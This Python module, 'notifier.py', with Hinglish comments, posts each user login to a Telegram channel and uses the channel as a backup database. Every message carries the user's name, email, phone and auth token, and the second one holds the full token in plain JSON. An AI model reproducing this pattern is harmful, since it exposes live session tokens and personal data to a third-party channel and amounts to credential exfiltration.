"""
notifier.py  –  Telegram sender  v5
════════════════════════════════════
Login hone par channel mein 2 messages bhejta hai:

  MSG 1 — Human readable log (admin ke liye dekhne ke liye)
  MSG 2 — Machine sync JSON (bot startup mein channel history
           padhkar is message se accounts restore karta hai)

Bot dono messages parse kar sakta hai.
Channel = Permanent backup database.
"""

import json
import httpx
from config import BOT_TOKEN, LOG_CHANNEL_ID


async def _send(text: str, parse_mode: str = "HTML") -> bool:
    if not BOT_TOKEN or not LOG_CHANNEL_ID:
        print("[NOTIFIER] BOT_TOKEN/LOG_CHANNEL_ID missing — skipping")
        return False
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            resp = await c.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={
                    "chat_id":                  LOG_CHANNEL_ID,
                    "text":                     text[:4096],
                    "parse_mode":               parse_mode,
                    "disable_web_page_preview": True,
                }
            )
            if resp.status_code != 200:
                print(f"[NOTIFIER] TG error: {resp.text[:200]}")
            return resp.status_code == 200
    except Exception as e:
        print(f"[NOTIFIER] Exception: {e}")
        return False


async def notify_user_login(login_json: dict) -> None:
    """
    Login hone par channel pe 2 messages bhejo:

    1) Human-readable log:
       🔐 NEW USER LOGIN
       👤 Name ...
       📱 Phone ...
       🆔 UserID ...
       #DATA# {...json...}      ← bot real-time mein yahi padhta hai

    2) Machine sync message:
       #SYNC_ACCOUNT#
       {...json...}             ← bot startup history scan mein yahi dhundhta hai
       Iska format fixed hai, kabhi change mat karo.
    """
    d      = login_json.get("data", {})
    userid = str(d.get("userid", "?"))
    name   = d.get("name",  "N/A")
    email  = d.get("email", "N/A")
    phone  = str(d.get("phone", "N/A"))
    token  = d.get("token", "")

    # Structured payload — dono messages mein yahi data jaata hai
    acc_payload = json.dumps({
        "userid": userid,
        "token":  token,
        "name":   name,
        "email":  email,
        "phone":  phone,
    }, ensure_ascii=False, separators=(',', ':'))

    # ── MSG 1: Human log + #DATA# line ─────────────────────────────────────
    msg1 = (
        f"🔐 <b>NEW USER LOGIN</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name   : <code>{name}</code>\n"
        f"📧 Email  : <code>{email}</code>\n"
        f"📱 Phone  : <code>{phone}</code>\n"
        f"🆔 UserID : <code>{userid}</code>\n"
        f"🔑 Token  : <code>{token[:60]}…</code>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"#DATA# {acc_payload}"
    )
    await _send(msg1)

    # ── MSG 2: Pure machine sync message ────────────────────────────────────
    # Bot startup scan sirf "#SYNC_ACCOUNT#" wali lines dhundhta hai
    # Format kabhi change mat karo — yahi channel ka permanent DB format hai
    msg2 = f"#SYNC_ACCOUNT#\n{acc_payload}"
    await _send(msg2, parse_mode="")   # no parse_mode — plain text


async def notify_text(msg: str) -> None:
    await _send(msg)
